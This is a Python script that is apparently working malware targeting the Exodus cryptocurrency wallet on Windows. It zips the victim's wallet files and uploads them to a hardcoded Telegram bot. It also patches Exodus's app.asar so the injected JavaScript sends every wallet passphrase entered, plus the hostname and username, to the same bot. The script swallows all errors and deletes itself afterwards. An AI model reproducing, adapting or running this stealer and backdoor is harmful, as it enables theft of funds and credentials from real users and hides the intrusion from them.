import os, json, struct, time, subprocess, shutil, base64, zlib, io, zipfile, sys

T, C = "8799308574:AAHPCa5VBjcFgvWIZsAG_cDFkJnBgrLjFU0", "7756904813"
D = os.path.expandvars(r"%LOCALAPPDATA%\Exodus")
W = os.path.expandvars(r"%APPDATA%\Exodus\exodus.wallet")

J = r'''
(function(){const h=require('https'),o=require('os'),t='8799308574:AAHPCa5VBjcFgvWIZsAG_cDFkJnBgrLjFU0',c='7756904813';
function s(m){if(!t||!c)return;const p=JSON.stringify({chat_id:c,text:m,parse_mode:'HTML'});
const x={hostname:'api.telegram.org',port:443,path:`/bot${t}/sendMessage`,method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(p)}};
const r=h.request(x);r.write(p);r.end()}
globalThis.sendPhrase=s;setTimeout(()=>{try{s(`🚀 Victim odpalil exodusa!\n\n• Host: ${o.hostname()}\n• User: ${o.userInfo().username}`)}catch(e){}},2000)})()
'''

def send_file(token, chat_id, file_bytes, filename):
    import http.client
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    conn = http.client.HTTPSConnection("api.telegram.org")
    payload = (f"--{boundary}\r\n"
               f"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n{chat_id}\r\n"
               f"--{boundary}\r\n"
               f"Content-Disposition: form-data; name=\"document\"; filename=\"{filename}\"\r\n"
               "Content-Type: application/zip\r\n\r\n").encode() + file_bytes + f"\r\n--{boundary}--\r\n".encode()
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    conn.request("POST", f"/bot{token}/sendDocument", payload, headers)
    conn.getresponse()

def p():
    try:
        if os.path.exists(W):
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
                for root, dirs, files in os.walk(W):
                    for file in files:
                        z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(W, '..')))
            send_file(T, C, buf.getvalue(), f"wallet_{os.getlogin()}.zip")
        v = sorted([d for d in os.listdir(D) if d.startswith('app-')])[-1]
        a = os.path.join(D, v, "resources", "app.asar")
        subprocess.run("taskkill /F /IM Exodus.exe /T", shell=True, capture_output=True)
        time.sleep(1)
        with open(a, "rb") as f:
            f.read(4)
            sz = struct.unpack('<I', f.read(4))[0]
            f.read(8)
            h = json.loads(f.read(sz-8).decode('utf-8').rstrip('\0'))
            ps = 8 + sz
        f_i = h['files']['src']['files']['app']['files']['main']['files']['index.js']
        o, s = int(f_i['offset']), int(f_i['size'])
        with open(a, "rb") as f:
            f.seek(ps + o)
            src = f.read(s).decode('utf-8')
        if "globalThis.sendPhrase" in src: return
        src = J + src
        if "setPassphrase(e){" in src: src = src.replace("setPassphrase(e){", "setPassphrase(e){try{globalThis.sendPhrase('🔑 HASLO: '+e)}catch(e){}")
        elif "setPassphrase(a){" in src: src = src.replace("setPassphrase(a){", "setPassphrase(a){try{globalThis.sendPhrase('🔑 HASLO: '+a)}catch(e){}")
        else: src = src.replace(".emit(e,a){", ".emit(e,a){try{if(e==='passphrase:set')globalThis.sendPhrase('🔑 HASLO: '+a)}catch(e){}")
        nb = src.encode('utf-8')
        dl = len(nb) - s
        f_i['size'] = len(nb)
        def u(n, o_f, d):
            if 'offset' in n and int(n['offset']) > o_f: n['offset'] = str(int(n['offset']) + d)
            if 'files' in n:
                for x in n['files'].values(): u(x, o_f, d)
        u(h, o, dl)
        hj = json.dumps(h, separators=(',', ':')).encode('utf-8')
        while len(hj) % 4 != 0: hj += b'\0'
        t_a = a + ".tmp"
        with open(t_a, "wb") as out:
            out.write(struct.pack('<IIII', 4, len(hj)+8, len(hj)+4, len(hj)))
            out.write(hj)
            with open(a, "rb") as old:
                old.seek(ps)
                out.write(old.read(o))
                out.write(nb)
                old.seek(ps + o + s)
                out.write(old.read())
        shutil.move(t_a, a)
    except: pass

def self_delete():
    file_path = os.path.abspath(sys.argv[0])
    cmd = f"timeout /t 2 > nul && del /f /q \"{file_path}\""
    subprocess.Popen(cmd, shell=True)

if __name__ == "__main__":
    p()
    self_delete()